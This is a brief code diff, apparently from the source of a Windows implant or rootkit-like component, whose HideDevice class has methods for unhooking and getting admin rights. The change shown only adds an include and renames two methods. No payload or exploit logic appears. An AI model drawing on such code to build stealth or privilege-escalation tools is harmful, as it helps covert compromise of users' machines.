@@ -9,6 +9,7 @@
 #include "H4-DLL.h"
 #include "common.h"
 #include "HM_Reloc.h"
+#include "strings.h"
 
 #define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
 #define STATUS_SUCCESS 0
@@ -214,7 +215,7 @@ BOOL HideDevice::unhook_init()
 	return TRUE;
 }
 
-void HideDevice::unhook_close()
+void HideDevice::close()
 {
 	if( hFile != INVALID_HANDLE_VALUE ) {
 		// XXX Dovrei mettere la ioctl di fine operazioni (se necessaria)
@@ -358,7 +359,7 @@ BOOL HideDevice::unhook_getadmin()
 }
 
 
-BOOL HideDevice::unhook_isdev()
+BOOL HideDevice::isdev()
 {
 	if ( hFile != INVALID_HANDLE_VALUE )
 		return TRUE;
@@ -639,4 +640,4 @@ HideDevice::HideDevice(WCHAR *driver_path) {
 	hFile = INVALID_HANDLE_VALUE;*/
 }
 
-HideDevice::~HideDevice(void) { unhook_close(); }
+HideDevice::~HideDevice(void) { close(); }
